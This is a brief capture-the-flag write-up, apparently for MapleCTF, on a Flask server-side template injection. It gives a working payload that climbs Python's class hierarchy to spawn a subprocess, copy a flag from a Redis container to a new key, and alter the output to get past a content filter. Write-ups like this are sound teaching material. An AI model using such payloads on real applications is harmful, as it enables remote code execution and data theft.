# La Culebra

## TL;DR

* SSTI in `render_template_string` but if you RCE, the flag isn't in the current container (it's a key in the redis store, which is in a different container)
* SSTI a subprocess to copy the flag value to another key, then read that key

```json
{"snake": "noodle", "description": "{{().__class__.__base__.__subclasses__()[394]([\"python3\", \"-c\", \"import redis; import base64; red = redis.Redis(host='redis', port=6379); flag = red.get('flag'); red.set('ok', base64.b64encode(flag[1:]))\"])}}"}
```

Multiple SSTI payloads are available and can work here - in this case, I'm setting a key called 'ok' with the flag value, but removing the first character to bypass the explicit checks for `maple{`.